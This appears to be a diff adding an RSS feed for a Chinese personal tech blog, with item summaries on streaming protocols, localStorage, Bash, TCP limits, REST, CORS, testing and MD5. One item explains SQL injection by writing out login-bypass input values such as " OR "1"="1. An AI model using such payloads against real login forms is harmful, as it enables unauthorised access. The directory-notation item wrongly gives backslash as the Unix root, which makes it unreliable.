+ RTMP：Real Time Messaging Protocol（实时消息传输协议），是Adobe公司为Flash/AIR平台和服务器之间音、视频及数据传输开发的实时消息传送协议。RTMP协议基于TCP，包括RTMP基本协议及RTMPT/RTMPS/RTMPE等多种变种。RTMP协议中，视频必须是H264编码，音频必须是AAC或MP3编码，且多以flv格式封包。RTMP是目前最主流的流媒体传输协议，对CDN支持良好，实现难度较低，是大多数的直播平台的选择。不过RTMP有着一个最大的不足——不支持浏览器，且Adobe已不再更新。因此直播服务要支持浏览器的话，需要另外的推送协议支持。 HLS：Http Live Streaming是由Apple公司定义的基于HTTP的流媒体实时传输协议。它的原理是将整个流分为多个小的文件来下载，每次只下载若干个。服务器端会将最新的直播数据生成新的小文件，客户端只要不停的按顺序播放从服务器获取到的文件，就实现了直播。基本上，HLS是以点播的技术实现了直播的体验。因为每个小文件的时长很短，客户端可以很快地切换码率，以适应不同带宽条件下的播放。分段推送的技术特点，决定了HLS的延迟一般会高于普通的流媒体直播协议。传输内容包括两部分：一是M3U8描述文件，二是TS媒体文件。TS媒体文件中的视频必须是H264编码，音频必须是AAC或MP3编码。由于数据通过HTTP协议传输，所以完全不用考虑防火墙或者代理的问题，而且分段文件的时长很短。 WebRTC：Web Real-Time Communication，即“源自网页即时通信”。WebRTC是一个支持浏览器进行实时语音、视频对话的开源协议。WebRTC的支持者甚多，Google、Mozilla、Opera推动其成为W3C推荐标准。WebRTC支持目前的主流浏览器，并且基于SRTP和UDP，即便在网络信号一般的情况下也具备较好的稳定性。此外，WebRTC可以实现点对点通信，通信双方延时低，此外，WebRTC可以实现点对点通信，通信双方延时低，是实现“连麦”功能比较好的选择。  2.拉流 拉流是指服务器已有直播内容，用指定地址进行拉取的过程，即推流是直播端，拉流是客户端</description>
+    </item>
+    
+    <item>
+      <title>随记(21)——什么是localStorage</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B021%E4%BB%80%E4%B9%88%E6%98%AF-localstorage/</link>
+      <pubDate>Fri, 26 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B021%E4%BB%80%E4%B9%88%E6%98%AF-localstorage/</guid>
+      <description>1.什么是 localStorage 在HTML5中，新加入了一个localStorage特性，这个特性主要是用来作为本地存储来使用的，解决了cookie存储空间不足的问题(cookie中每条cookie的存储空间为4k)，localStorage中一般浏览器支持的是5M大小，这个在不同的浏览器中localStorage会有所不同。
+2.localStorage的优势  localStorage拓展了cookie的4K限制 localStorage会可以将第一次请求的数据直接存储到本地，这个相当于一个5M大小的针对于前端页面的数据库，相比于cookie可以节约带宽，但是这个却是只有在高版本的浏览器中才支持的  3.localStorage的局限  浏览器的大小不统一，并且在IE8以上的IE版本才支持localStorage这个属性 目前所有的浏览器中都会把localStorage的值类型限定为string类型，这个在对我们日常比较常见的JSON对象类型需要一些转换 localStorage在浏览器的隐私模式下面是不可读取的 localStorage本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡 localStorage不能被爬虫抓取到 localStorage与sessionStorage的唯一一点区别就是localStorage属于永久性存储，而sessionStorage属于当会话结束的时候，sessionStorage中的键值对会被清空  4.localStorage的使用  localStorage的使用是遵循同源策略的，不同的网站直接是不能共用相同的localStorage localStorage只支持string类型的存储，即使存储进去的是int类型，但是打印出来仍是string类型 localStorage相当于一个前端的数据库，也有增删查改的功能 一般会将JSON存入localStorage中，但是在localStorage会自动将localStorage转换成为字符串形式，这个时候可以使用JSON.stringify()这个方法，来将JSON转换成为JSON字符串。读取之后要将JSON字符串转换成为JSON对象，使用JSON.parse()方法  </description>
+    </item>
+    
+    <item>
+      <title>随记(20)——目录的简单表示</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B020%E7%9B%AE%E5%BD%95%E7%9A%84%E7%AE%80%E5%8D%95%E8%A1%A8%E7%A4%BA/</link>
+      <pubDate>Wed, 23 Dec 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B020%E7%9B%AE%E5%BD%95%E7%9A%84%E7%AE%80%E5%8D%95%E8%A1%A8%E7%A4%BA/</guid>
+      <description> 用户所在的工作目录，当前目录，使用一个点 . 表示，即 ./ 当前目录的上一级目录，父目录，使用两个点 .. 来表示，即 ../ 使用 \ 来表示根目录 如果一个目录或文件名以一个点 . 开始，表示这个目录或文件是一个隐藏目录或文件(如：.bashrc)  </description>
+    </item>
+    
+    <item>
+      <title>随记(19)——什么是SQL漏洞</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B019%E4%BB%80%E4%B9%88%E6%98%AF-sql-%E6%BC%8F%E6%B4%9E/</link>
+      <pubDate>Fri, 11 Dec 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B019%E4%BB%80%E4%B9%88%E6%98%AF-sql-%E6%BC%8F%E6%B4%9E/</guid>
+      <description>要了解sql漏洞，首先要搞清楚sql语句。sql 全称 Structured Query Language(结构化查询语言)，是一种应用于数据库查询的编程语言。
+SELECT * FROM admin WHERE user = &amp;#34;test&amp;#34; AND pass = &amp;#34;123456&amp;#34;; 这一句就是从admin表中查找 user为test 并且 pass为123456 的记录，并将满足要求的记录输出。但是如果我输入的密码是 &amp;quot; OR &amp;ldquo;1&amp;rdquo;=&amp;ldquo;1 ，用户名是 test ，那么sql语句则变为
+SELECT * FROM admin WHERE user = &amp;#34;test&amp;#34; AND pass = &amp;#34;&amp;#34; OR &amp;#34;1&amp;#34;=&amp;#34;1&amp;#34;; 很明显，WHERE后的表达式一定返回true，于是mysql会将每条记录都输出，而网站误以为这个用户名是正确的，然后让你以test的身份登录。如果网站还设有管理权限，那么你可以试试密码为 &amp;quot; OR &amp;ldquo;1&amp;rdquo;=&amp;ldquo;1&amp;rdquo; AND writable = TRUE AND &amp;ldquo;&amp;quot;=&amp;quot;，这样，sql查询语句就是
+SELECT * FROM admin WHERE user = &amp;#34;test&amp;#34; AND pass = &amp;#34;&amp;#34; OR &amp;#34;1&amp;#34;=&amp;#34;1&amp;#34; AND writable = TRUE AND &amp;#34;&amp;#34;=&amp;#34;&amp;#34;; 其中 user = &amp;ldquo;test&amp;rdquo; AND pass = &amp;quot;&amp;rdquo; OR &amp;ldquo;1&amp;rdquo;=&amp;ldquo;1&amp;rdquo; 始终返回true，所以实际条件为 writable = TRUE AND &amp;ldquo;&amp;quot;=&amp;quot;&amp;quot;，即writable = TRUE，于是mysql会将writable为true的记录输出。</description>
+    </item>
+    
+    <item>
+      <title>随记(18)——什么是Bash Shell</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B018%E4%BB%80%E4%B9%88%E6%98%AF-bash-shell/</link>
+      <pubDate>Wed, 09 Dec 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B018%E4%BB%80%E4%B9%88%E6%98%AF-bash-shell/</guid>
+      <description>1.什么是Bash Bash是Unix shell的一种，运行于大多数类Unix系统的操作系统之上，Linux与Mac OS都将它作为默认shell。
+此外Bash是一个命令处理器，通常运行于文本窗口中，并能执行用户直接输入的命令。Bash还能从文件中读取命令。
+2.什么是Shell 在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它接收用户命令，然后调用相应的应用程序。
+同时它又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。
+Shell是操作系统最外面的一层，是文字操作系统与外部最主要的接口，Shell管理你与操作系统之间的交互：等待你输入，向操作系统解释你的输入，并且处理各种各样的操作系统的输出结果。
+3.Shell的两大类 一：图形界面shell（Graphical User Interface shell 即 GUI shell） 例如：应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。
+二：命令行式shell（Command Line Interface shell ，即CLI shell） 例如：bash / sh / ksh / csh / zsh（Unix/linux 系统）（MS-DOS系统），cmd.exe / 命令提示字符（Windows NT 系统），Windows PowerShell（支持 .NET Framework 技术的 Windows NT 系统）
+三：主流的Shell  Bourne Shell：首个重要的标准Unix Shell，是UNIX 最初使用的 shell，并且在每种 UNIX 上都可以使用, 在 shell 编程方面相当优秀，但在处理与用户的交互方面做得不如其他几种Shell C Shell：首个交互式功能Shell，并把ALGOL风格的语法结构变成了C语言风格 Korn Shell：ksh结合了所有的C shell的交互式特性，并融入了Bourne shell的语法（Bourne shell用来编程，C shell用来交互） Bourne Again Shell (bash)：替代Bourne shell POSIX Shell：Korn shell的一个变种，主要为hp(惠普)提供  4.</description>
+    </item>
+    
+    <item>
+      <title>随记(17)——Linux最多支持多少TCP连接</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B017linux-%E6%9C%80%E5%A4%9A%E6%94%AF%E6%8C%81%E5%A4%9A%E5%B0%91-tcp-%E8%BF%9E%E6%8E%A5/</link>
+      <pubDate>Tue, 08 Dec 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B017linux-%E6%9C%80%E5%A4%9A%E6%94%AF%E6%8C%81%E5%A4%9A%E5%B0%91-tcp-%E8%BF%9E%E6%8E%A5/</guid>
+      <description>参考原文：一台Linux服务器最多能支撑多少个TCP连接？ @PHP饭米粒 
+ 1.并发问题 在网络开发中，有这样一个基础问题始终没有彻底搞明白。那就是一台服务器最大究竟能支持多少个网络连接？
+很多同学看到这个问题的第一反应是65535。原因是：“听说端口号最多有65535个，那长连接就最多保持65535个了”。是这样的吗？还有的人说：“应该受TCP连接里四元组的空间大小限制，算起来是200多万亿个！”
+2.一次关于服务器端并发的聊天 &amp;ldquo;TCP连接四元组是源IP地址、源端口、目的IP地址和目的端口。任意一个元素发生了改变，那么就代表的是一条完全不同的连接了。拿我的Nginx举例，它的端口是固定使用80。另外我的IP也是固定的，这样目的IP地址、目的端口都是固定的。剩下源IP地址、源端口是可变的。所以理论上我的Nginx上最多可以建立2的32次方（ip数）×2的16次方（port数）个连接。这是两百多万亿的一个大数字！！&amp;rdquo;
+&amp;ldquo;进程每打开一个文件（linux下一切皆文件，包括socket），都会消耗一定的内存资源。如果有不怀好心的人启动一个进程来无限的创建和打开新的文件，会让服务器崩溃。所以linux系统出于安全角度的考虑，在多个位置都限制了可打开的文件描述符的数量，包括系统级、用户级、进程级。这三个限制的含义和修改方式如下：&amp;rdquo;
+ 系统级：当前系统可打开的最大数量，通过fs.file-max参数可修改 用户级：指定用户可打开的最大数量，修改/etc/security/limits.conf 进程级：单个进程可打开的最大数量，通过fs.nr_open参数可修改  &amp;ldquo;我的接收缓存区大小是可以配置的，通过sysctl命令就可以查看。&amp;rdquo;
+$ sysctl -a | grep rmemnet.ipv4.tcp_rmem = 4096 87380 8388608net.core.rmem_default = 212992net.core.rmem_max = 8388608&amp;ldquo;其中在tcp_rmem&amp;quot;中的第一个值是为你们的TCP连接所需分配的最少字节数。该值默认是4K，最大的话8MB之多。也就是说你们有数据发送的时候我需要至少为对应的socket再分配4K内存，甚至可能更大。&amp;rdquo;
+&amp;ldquo;TCP分配发送缓存区的大小受参数net.ipv4.tcp_wmem配置影响。&amp;rdquo;
+$ sysctl -a | grep wmemnet.ipv4.tcp_wmem = 4096 65536 8388608net.core.wmem_default = 212992net.core.wmem_max = 8388608&amp;ldquo;在net.ipv4.tcp_wmem&amp;quot;中的第一个值是发送缓存区的最小值，默认也是4K。当然了如果数据很大的话，该缓存区实际分配的也会比默认值大。&amp;rdquo;
+3.服务器百万连接达成记 “准备啥呢，还记得前面说过Linux对最大文件对象数量有限制，所以要想完成这个实验，得在用户级、系统级、进程级等位置把这个上限加大。我们实验目的是100W，这里都设置成110W，这个很重要！因为得保证做实验的时候其它基础命令例如ps，vi等是可用的。“
+活动连接数量确实达到了100W：
+$ ss -n | grep ESTAB | wc -l 1000024当前机器内存总共是3.9GB，其中内核Slab占用了3.2GB之多。MemFree和Buffers加起来也只剩下100多MB了：
+$ cat /proc/meminfoMemTotal: 3922956 kBMemFree: 96652 kBMemAvailable: 6448 kBBuffers: 44396 kB.</description>
+    </item>
+    
+    <item>
+      <title>随记(16)——RESTful API接口设计</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B016restful-api-%E6%8E%A5%E5%8F%A3%E8%AE%BE%E8%AE%A1/</link>
+      <pubDate>Sun, 06 Dec 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B016restful-api-%E6%8E%A5%E5%8F%A3%E8%AE%BE%E8%AE%A1/</guid>
+      <description>原文参考：RESTful API 设计指南 @阮一峰 
+ 1.API 接口的产生 网络应用程序，分为前端和后端两个部分。当前的发展趋势，就是前端设备层出不穷（手机、平板、桌面电脑、其他专用设备&amp;hellip;&amp;hellip;）。因此，必须有一种统一的机制，方便不同的前端设备与后端进行通信。这导致API构架的流行，甚至出现 API First 的设计思想。RESTful API 是目前比较成熟的一套互联网应用程序的API设计理论。
+2.API 应部署在域名下 应该尽量将API部署在专用域名之下。
+https://api.example.com如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下。
+https://example.org/api/3.API 版本应放在URL中 应该将API的版本号放入URL。
+https://api.example.com/v1/另一种做法是，将版本号放在HTTP头信息中，但不如放入URL方便和直观。Github 采用这种做法。
+4.API 的路径 路径又称&amp;quot;终点&amp;quot;（endpoint），表示API的具体网址。
+在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的&amp;quot;集合&amp;quot;（collection），所以API中的名词也应该使用复数。
+举例来说，有一个API提供动物园（zoo）的信息，还包括各种动物和雇员的信息，则它的路径应该设计成下面这样。
+ https://api.example.com/v1/zoos https://api.example.com/v1/animals https://api.example.com/v1/employees  5.HTTP 动词-资源请求 常用的HTTP动词有下面五个（括号里是对应的SQL命令）。
+ GET（SELECT）：从服务器取出资源（一项或多项）。 POST（CREATE）：在服务器新建一个资源。 PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。 PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。 DELETE（DELETE）：从服务器删除资源。  还有两个不常用的HTTP动词。
+ HEAD：获取资源的元数据。 OPTIONS：获取信息，关于资源的哪些属性是客户端可以改变的。  下面是一些例子。
+ GET /zoos：列出所有动物园 POST /zoos：新建一个动物园 GET /zoos/ID：获取某个指定动物园的信息 PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息） PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息） DELETE /zoos/ID：删除某个动物园 GET /zoos/ID/animals：列出某个指定动物园的所有动物 DELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物  6.</description>
+    </item>
+    
+    <item>
+      <title>随记(15)——WebDriver click与JavaScript click的区别</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B015webdriver-click-%E4%B8%8E-javascript-click-%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
+      <pubDate>Tue, 01 Dec 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B015webdriver-click-%E4%B8%8E-javascript-click-%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
+      <description>原文参考：webdriver-click-vs-javascript-click @stackoverflow 
+ 问题出现 在自动测试时有时候会出现无法通过 selenium WebDriver 点击命令来单击元素，完成操作，但是可以通过执行JavaScript来单击该元素来解决这个问题。
+element = driver.find_element_by_id(&amp;#34;myid&amp;#34;) driver.execute_script(&amp;#34;arguments[0].click();&amp;#34;, element) 回答 这两种方法的本质区别在浏览器的操作上：
+ WebDriver：**当 WebDriver 执行单击时，它会尽可能地模拟当真实用户使用浏览器时发生的情况。**比如您有一个元素 A，该按钮显示&amp;quot;单击我&amp;quot;，元素 B 是一个透明但具有其尺寸和设置的元素 B，B 完全覆盖 A。然后，您告诉 WebDriver 单击 A，WebDriver 将模拟单击，但结果却是 B 首先接收单击。这是因为 B 覆盖 A，如果用户尝试单击 A，则 B 将首先获取事件。A 最终是否会获得单击事件取决于 B 处理事件的方式。无论如何，在这种情况下，WebDriver 的行为与实际用户尝试单击 A 时的行为相同。 JavaScript：**假如您使用 JavaScript 来做 。单击此方法不会重现用户尝试单击 A 时真正发生的情况。**JavaScript 将事件直接发送到 A，B 不会收到任何事件。  这也就解释了为什么 JavaScript 单击在 WebDriver 单击不起作用时有效？
+正如我上面提到的，WebDriver 将尽力模拟当真实用户使用浏览器时发生的情况。事实是，DOM 可以包含用户无法与之交互的元素，并且 WebDriver 不允许您单击这些元素。除了我提到的重叠情况外，这还要求不能单击不可见的元素。我在其他一些问题中看到的一个常见情况是有人试图与 DOM 中已经存在的 GUI 元素进行交互，但仅在操作某些其他元素时才可见。这有时会与下拉菜单有关：您必须先单击显示下拉列表的按钮，然后才能选择菜单项。如果有人尝试在菜单可见之前单击菜单项，WebDriver 会犹豫，并说无法操作该元素。如果此人随后尝试使用 JavaScript 进行操作，它将起作用，因为事件直接传递到元素，而不考虑可见性。</description>
+    </item>
+    
+    <item>
+      <title>随记(14)——跨域资源请求 CORS</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B014%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E8%AF%B7%E6%B1%82-cors/</link>
+      <pubDate>Mon, 30 Nov 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B014%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E8%AF%B7%E6%B1%82-cors/</guid>
+      <description>1.什么是CORS CORS是一个W3C标准，全称是&amp;quot;跨域资源共享&amp;quot;，它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。
+2.浏览器的同源安全策略 浏览器只允许请求当前域的资源，而对其他域的资源表示不信任。那怎么才算跨域呢？
+ 请求协议http,https的不同 域domain的不同 端口port的不同  3.HTTP的两种请求 浏览器将CORS请求分成两类：简单请求（simple request）和 非简单请求（not-so-simple request）。只要同时满足以下两大条件，就属于简单请求。
+（1) 请求方法是以下三种方法之一：
+ HEAD GET POST  （2）HTTP的头信息不超出以下几种字段：
+ Accept Accept-Language Content-Language Last-Event-ID Content-Type：只限于三个值（application/x-www-form-urlencoded、multipart/form-data、text/plain）  凡是不同时满足上面两个条件，就属于非简单请求。浏览器对这两种请求的处理，是不一样的。
+4.简单请求 对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段。
+GET /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... 上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。
+如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。
+如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。
+GET /cors HTTP/1.1 Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Credentials: true Access-Control-Expose-Headers: FooBar Content-Type: text/html; charset=utf-8 上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。
+ Access-Control-Allow-Origin：该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。 Access-Control-Allow-Credentials：该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。 Access-Control-Expose-Headers：该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader(&amp;lsquo;FooBar&amp;rsquo;)可以返回FooBar字段的值。  5.</description>
+    </item>
+    
+    <item>
+      <title>随记(13)——测试用例的设计</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B013%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E7%9A%84%E8%AE%BE%E8%AE%A1/</link>
+      <pubDate>Fri, 30 Oct 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B013%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E7%9A%84%E8%AE%BE%E8%AE%A1/</guid>
+      <description>1.什么是测试用例   设计一个情况，软件程序在这种情况下，必须能够正常运行并且达到程序所设计的预期结果。（即把程序可能发生的每种情况列出来）
+  如果程序在这种情况下不能正常运行，而且这种问题会重复发生，那就表示软件程序测试人员已经测出软件有缺陷，这时候就必须将这个问题标识出来，并且通知软件开发人员。软件开发人员接获通知后，将这个问题修改完成于下一个测试版本内。
+  软件测试工程师取得新的测试版本后，必须利用同一个用例来测试这个问题，确保该问题已修改完成。
+  2.用例设计方法 a.等价类 解释：依据需求将输入划分为若干个等价类,从等价类中选出一个测试用例,如果这个测试用例测试通过,则认为所代表的整个等价类测试通过,这样就可以通过较少的测试用例达到尽量多的功能覆盖,解决了不能穷举测试的问题
+弊端：等价类只考虑输入域的分类,没有考虑输入域的组合,需要其他的设计方法和补充
+ 有效等价类:对于程序的规格说明书是合理的,有意义的输入数据构成的集合,利用有效等价类验证程序是否实现了规格说明书中所规定的功能和性能 无效等价类:根据需求说明书,不满足需求的集合  超市买水果有效等价类:苹果,香蕉,桃子...无效等价类:青菜,大米,饮料... b.边界值 解释：边界值分析法就是对输入或者输出的边界值进行测试的一种黑盒测试方法，通常边界值分析法是作为对等价类划分方法的补充,这种情况下,其测试用例来自等价类的边界
+输入框长度为1-11,边界值取值:0,1,11,12运动员参赛项目为1-3项,边界值取值:0项,1项,3项,4项查询面页面有999行,每50行为一页,边界值取值:0行,1行,50行,51行,999行 c.因果图 解释：因果图是一种简化了的逻辑图,能直观的表明程序输入条件(原因)和输出动作(结果)之间的相互关系,因果图法是借助图形来设计测试用例的一种系统方法,特别适用于被测试程序具有多种输入条件,程序的输出又依赖于输入条件的各种情况
+因果图设计测试用例的步骤:
+ 分析所有可能的输入和可能的输出 找出输入与输出之间的关系 画出因果图 把因果图转化成判定表 把判定表对应到每一个测试用例  案例：
+淘宝在双十一退出打折优惠活动,订单已提交,订单金额大于300或有红包,则优惠1.对于这条业务规则,首先通过分析所有可能的输入和可能的输出,可以得到如下结果:
+ 输入:订单已提交,订单金额大于300,有红包 输出:优惠,不优惠  2.然后进行第二步,找出输入域输出之间的关系,通过分析得出以下对应关系
+ 订单已提交,订单金额大于300,则优惠 订单已提交,订单金额小于等于300,无红包,不优惠 订单已提交,订单金额小于等于300,有红包,优惠 订单已提交,有红包,优惠 订单未提交,不优惠  3.为了方便画出因果图和判定图,对所有输入和输出编号,编号如下:
+ 1:订单已提交 2:订单金额大于300 3:有红包 21:优惠 22:不优惠  4.画因果图，画判定表，得测试用例
+d.正交排列 解释：正交法的目的是为了减少用例数量,用尽量少的用例,覆盖输入的两两组合，正交试验设计是研究多因素多水平的一种设计方法,它是根据正交性,由实验因素的全部水平组合中挑选出部分有代表性的点进行实验,通过对这部分实验结果的分析了解全面试验的情况,找出最优的水平组合,正交试验设计是一种基于正交表的,高效率,快速,经济的试验.
+正交排列需要掌握的基本知识:因素(Factor):在一项试验中,凡是考虑的变量都称为因素(变量)水平/位级(Level):在试验范围内,因素被考查的值称为水平(变量的取值)正交表的构成:- 行数(Runs):正交表中行的个数,即试验的次数,用N表示- 因素数(Factors): 正交表中列的个数,用C表示- 水平数(Levels): 任何单个因素能够取到的值的最大个数,正交表中包含的值为从0到数&amp;quot;水平数-1&amp;quot;或者从1到&amp;quot;水平数&amp;quot;,用T表示正交表的表示形式: L=行数(水平数*因素数) L=N(TC)正交表的两条性质:- 每一列中各数字出现的次数都一样多- 任何两列锁构成的各有序数对出现的次数都一样多正交法设计测试用例的步骤：</description>
+    </item>
+    
+    <item>
+      <title>随记(12)——MD5加密与耦合</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B012md5-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%80%A6%E5%90%88/</link>
+      <pubDate>Wed, 23 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B012md5-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%80%A6%E5%90%88/</guid>
+      <description>1.MD5加密 百科 MD5信息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个128位（16字节）的散列值（hash value），用于确保信息传输完整一致。MD5由美国密码学家罗纳德·李维斯特（Ronald Linn Rivest）设计，于1992年公开，用以取代MD4算法。这套算法的程序在 RFC 1321 标准中被加以规范。1996年后该算法被证实存在弱点，可以被加以破解，对于需要高度安全性的数据，专家一般建议改用其他算法，如SHA-2。2004年，证实MD5算法无法防止碰撞（collision），因此不适用于安全性认证，如SSL公开密钥认证或是数字签名等用途。
+特点  不可逆，几乎不能还原出原始数据 完全相同的一段数据，不论时间地点（加密算法相同的条件）加密出的32位的字符串完全相同 解密方法只有【碰撞】(撞库，穷举足够的数据，几乎难以实现解密) 【散列】(Hash，哈希，把任意长度的输入通过散列算法变换成固定长度的输出，该输出就是散列值）能力强，数据即使只有百分之零点几的的差别也会导致MD5完全不一样，只要两个数据的MD5相同，那我们可以认为这两个数据完全相同  2.耦合 百科 耦合（Coupling）表示两个子系统（或类）之间的关联程度，当一个子系统（或类）发生变化时对另一个子系统（或类）的影响很小，则称它们是松散耦合的；反之，如果变化的影响很大时，则称它们是紧密耦合的。耦合的强弱取决于模块间接间的复杂性、引用模块的位置和数据的传送方式等。设计时应尽量使模块间的耦合度小，模块间的耦合度直接影响系统的可理解性、可测试性、可靠性和可维护性。
+分类 耦合也可分为七级，从低至高为：非直接耦合（Nondirect coupling）、数据耦合（Data coupling）、标记耦合（Stamp coupling）、控制耦合（Control coupling）、外部耦合（External coupling）、公共耦合（Common coupling）、内容耦合（Content coupling）。耦合度应越低越好 。
+ 非直接耦合：两模块间彼此无任何交互 数据耦合：两模块间仅通过参数交换信息 标记耦合：如果模块间传送的参数包含着复合数据结构，例如含有若干数据项的数据记录 控制耦合：传递的参数中含有控制信息，如一个用于控制模块内部逻辑的标志信息 外部耦合：指若干模块与同一个外部环境进行关联，如I/O处理使所有I/O模块与特定的设备、格式和通信协议相关联 公共耦合：指模块间存在着全局变量、公共数据区或可共享的文件 内容耦合：指模块间存在着一个模块直接转入另一模块内部或一个模块直接使用另一模块的数据或控制信息的路径  </description>
+    </item>
+    
+    <item>
+      <title>随记(11)——Web性能测试的指标</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B011web-%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E7%9A%84%E6%8C%87%E6%A0%87/</link>
+      <pubDate>Sun, 20 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B011web-%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E7%9A%84%E6%8C%87%E6%A0%87/</guid>
+      <description>1.事务 事务就是用户某一步或几步操作的集合，它具有一个完整意义。比如用户对某一个页面的一次请求，对某系统的一次登录，对商品的一次确认支付过程。这些我们都可以看作一个事务，需要理解的是事务不等于请求。
+2.请求(PV) PV 是 Page View 的缩写。用户通过浏览器访问页面，对应用服务器产生的一次请求，记为一个 PV。将这个概念做了延伸，系统真实处理的一个请求，视为一个 PV。
